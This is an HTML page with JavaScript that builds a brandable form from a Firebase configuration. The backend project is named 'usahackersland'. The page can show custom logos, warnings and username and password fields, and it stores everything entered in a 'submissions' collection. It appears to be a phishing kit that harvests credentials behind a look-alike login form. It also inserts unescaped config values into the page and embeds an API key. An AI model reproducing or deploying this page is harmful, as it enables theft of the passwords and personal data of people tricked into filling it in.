<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dynamic Form</title>

<style>
body{
  font-family: Arial, sans-serif;
  background:#f4f6f8;
  padding:20px;
}
#bgVideoLayer{
  position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover; z-index:-3; display:none;
}
#bgImageLayer{
  position:fixed; top:0; left:0; width:100vw; height:100vh; background-size:cover; background-position:center; background-repeat:no-repeat; z-index:-2;
}
#bgColorLayer{
  position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:-1;
}
#formContainer{
  max-width:600px;
  margin:auto;
  background:#fff;
  padding:20px;
  border-radius:10px;
  box-shadow:0 0 10px rgba(0,0,0,0.1);
}
.builder-media{text-align:center;margin-bottom:12px;}
.builder-media img{max-width:140px;height:auto;margin-bottom:8px;}
h2{text-align:center;margin:10px 0;}
#formDesc{text-align:center;margin-bottom:12px;}
#failureWarning{color:#b71c1c;font-weight:bold;text-align:center;margin-bottom:4px;}
#submitResult{color:#2e7d32;font-weight:bold;text-align:center;margin-bottom:10px;opacity:0;transition:opacity 0.5s;}
input, textarea, button{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box;}
button{cursor:pointer;background:#1976d2;color:#fff;border:none;}
.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px;word-break:break-all;}
</style>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>

<body>
<video id="bgVideoLayer" autoplay muted loop playsinline></video>
<div id="bgImageLayer"></div>
<div id="bgColorLayer"></div>

<div id="formContainer">
  <div id="imageContainer" class="builder-media"></div>
  <h2 id="formTitle">Loading...</h2>
  <div id="formDesc"></div>
  <div id="failureWarning"></div>
  <div id="submitResult">✅ Submitted Successfully</div>
  <form id="dynamicForm"></form>
  <div id="embedLinks"></div>
</div>

<script>
const $ = id => document.getElementById(id);

/* FIREBASE */
firebase.initializeApp({
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
});
const db = firebase.firestore();

/* PARAMS */
const formId = new URLSearchParams(location.search).get("id");
const formEl = $("dynamicForm");
const imageContainer = $("imageContainer");
const embedEl = $("embedLinks");
const submitResult = $("submitResult");
const failureWarning = $("failureWarning");

let formConfig = null;

if(!formId){
  $("formTitle").innerText = "Form ID missing!";
}

/* LOAD FORM - CORRECTED PATH */
const parentDocId = "NbU3q0ca3c0Ocs4quouS"; // Your parent doc in 'emergency'
db.collection("emergency")
  .doc(parentDocId)
  .collection("forms")
  .doc(formId)
  .get()
  .then(doc => {
    if(!doc.exists){
      $("formTitle").innerText = "Form not found!";
      return;
    }
    formConfig = doc.data();
    renderForm();
  });

/* BACKGROUND LOADER */
function loadBackgroundFromForm(cfg){
  if(!cfg) return;
  document.body.classList.add("has-bg");
  const bgVideo = $("bgVideoLayer"), bgImage = $("bgImageLayer"), bgColor = $("bgColorLayer");
  if(bgVideo){ bgVideo.pause(); bgVideo.src=""; bgVideo.style.display="none"; }
  if(bgImage) bgImage.style.backgroundImage = "";
  if(bgColor) bgColor.style.backgroundColor = "";
  if(cfg.bgColor) bgColor.style.backgroundColor = cfg.bgColor;
  if(cfg.bgImageURL){ bgImage.style.backgroundImage=`url(${cfg.bgImageURL})`; bgImage.style.backgroundSize=cfg.bgSize||"cover"; bgImage.style.backgroundPosition="center"; bgImage.style.backgroundRepeat="no-repeat"; }
  if(cfg.bgVideoURL){ bgVideo.src=cfg.bgVideoURL; bgVideo.style.display="block"; bgVideo.muted=true; bgVideo.loop=true; bgVideo.autoplay=true; bgVideo.playsInline=true; bgVideo.play().catch(()=>{}); }
}

/* RENDER FORM */
function renderForm() {
  $("formTitle").innerText = formConfig.title || "";
  $("formTitle").style.color = formConfig.titleColor || "#000";
  $("formDesc").innerText = formConfig.description || "";
  $("formDesc").style.color = formConfig.textColor || "#444";
  imageContainer.innerHTML = ""; formEl.innerHTML = ""; embedEl.innerHTML = ""; failureWarning.innerText = "";

  if(formConfig.avatarURL) imageContainer.innerHTML+=`<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
  if(formConfig.logoURL) imageContainer.innerHTML+=`<img src="${formConfig.logoURL}">`;
  if(formConfig.enableWarning && formConfig.warning) failureWarning.innerText=formConfig.warning;

  if(formConfig.addAuth && formConfig.usernamePlaceholder && formConfig.passwordPlaceholder){
    formEl.innerHTML+=`<input name="username" placeholder="${formConfig.usernamePlaceholder}" required>
                        <input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>`;
  }

  if(Array.isArray(formConfig.extraFields)){
    formConfig.extraFields.filter(f=>f?.trim()).forEach(f=>{
      formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
    });
  }

  // Main Button
  if(formConfig.showMainBtn && formConfig.buttonText){
    const btn = document.createElement("button");
    btn.textContent=formConfig.buttonText;
    btn.style.background=formConfig.btnColor||"#1976d2";
    btn.style.color="#fff";
    btn.onclick=submitForm;
    formEl.appendChild(btn);
  }

  // Embed Links
  if(Array.isArray(formConfig.embedLinks)){
    formConfig.embedLinks.forEach(l=>{
      if(!l?.show || !l.url) return;
      const div=document.createElement("div"); div.className="embedLink";
      div.innerHTML=`<strong>${l.text||""}</strong><br><a href="${l.url}" target="_blank">${l.url}</a>`;
      if(l.desc) div.innerHTML+=`<br><small>${l.desc}</small>`;
      embedEl.appendChild(div);
    });
  }

  // Background
  loadBackgroundFromForm(formConfig);
}

/* SUBMIT FORM */
function submitForm(e){
  e.preventDefault();
  const data={};
  formEl.querySelectorAll("input,textarea").forEach(i=>{ if(i.value.trim()) data[i.name]=i.value; });
  db.collection("submissions").add({ formId, title:formConfig.title||"", data, createdAt:new Date().toISOString() });
  submitResult.style.opacity=1;
  setTimeout(()=>submitResult.style.opacity=0,3000);
  formEl.reset();
}
</script>
</body>
</html>
